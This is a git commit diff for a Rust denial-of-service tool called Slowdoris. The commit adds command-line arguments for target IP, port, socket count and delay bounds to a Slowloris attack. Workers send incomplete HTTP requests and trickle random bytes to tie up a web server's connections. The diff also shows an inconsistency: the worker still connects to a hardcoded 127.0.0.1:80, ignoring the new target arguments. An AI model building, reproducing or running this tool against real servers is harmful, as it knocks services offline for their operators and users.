9b46e162098514865ab5336bda8f711fc6171f80
Michael Van Leeuwen <michaeljvanleeuwen@gmail.com>
2021-11-02 20:06:01 -0400

    Add cli args

--- src/main.rs
+++ src/main.rs
@@ -1,22 +1,41 @@
-mod slowloris_worker;
+mod worker;
 
 use scoped_threadpool::Pool;
-use slowloris_worker::SlowlorisWorker;
+use worker::Worker;
 use std::net::TcpStream;
+use clap::Parser;
+
+#[derive(Parser)]
+#[clap(version = "1.0", author = "Michael V. <michaeljvanleeuwen@gmail.com>")]
+struct Slowdoris {
+    /// The IP address of the webserver
+    ip: String,
+    /// The port the webserver is running on
+    port: String,
+    /// How worker sockets to open
+    num_workers: u8,
+    /// Lower bound of request delay
+    sleep_min: u8,
+    /// Maximum bound of request delay
+    sleep_max: u8,
+}
 
 fn main() {
-    const NUM_THREADS: u8 = 15;
-    const SECONDS: u8 = 30;
+    let args = Slowdoris::parse();
 
-    if TcpStream::connect("127.0.0.1:80").is_err() {
+    if args.sleep_min >= args.sleep_max {
+        panic!("sleep_min must be < sleep_max")
+    }
+
+    if TcpStream::connect(format!("{}:{}", args.ip, args.port)).is_err() {
         panic!("Connection failed. Is the server up?");
     }
 
-    let mut pool = Pool::new(NUM_THREADS as u32);
+    let mut pool = Pool::new(args.num_workers as u32);
     let mut num_workers = 0;
     pool.scoped(|scoped| {
-        while num_workers < NUM_THREADS {
-            if let Ok(mut worker) = SlowlorisWorker::new(num_workers, SECONDS) {
+        while num_workers < args.num_workers {
+            if let Ok(mut worker) = Worker::new(num_workers, (args.sleep_min, args.sleep_max)) {
                 println!("[slowloris_{:02}] Spawned.", num_workers);
                 scoped.execute(move || {
                     worker.start();
--- src/worker.rs
+++ src/worker.rs
@@ -5,20 +5,20 @@ use std::net::TcpStream;
 use std::thread;
 use std::time::Duration;
 
-pub struct SlowlorisWorker {
+pub struct Worker {
     id: u8,
-    sleep_time: u8,
+    sleep_bounds: (u8, u8),
     stream: TcpStream,
 }
 
-impl SlowlorisWorker {
-    pub fn new(id: u8, sleep_time: u8) -> Result<SlowlorisWorker, Error> {
+impl Worker {
+    pub fn new(id: u8, sleep_bounds: (u8, u8)) -> Result<Worker, Error> {
         let mut stream = TcpStream::connect("127.0.0.1:80")?;
         stream.write_all("GET / HTTP/1.1\r\nUser-Agent: slowloris\r\n".as_bytes())?;
 
-        Ok(SlowlorisWorker {
+        Ok(Worker {
             id,
-            sleep_time,
+            sleep_bounds,
             stream,
         })
     }
@@ -27,7 +27,7 @@ impl SlowlorisWorker {
         let mut rng = SmallRng::from_entropy();
 
         loop {
-            thread::sleep(Duration::from_secs(rng.gen_range(0, self.sleep_time) as u64));
+            thread::sleep(Duration::from_secs(rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64));
             match &self.stream.write_all(&rng.gen::<[u8; 1]>()) {
                 Ok(_) => println!("[slowloris_{:02}] Update sent.", self.id),
                 Err(_) => println!("[slowloris_{:02}] Update failed.", self.id),
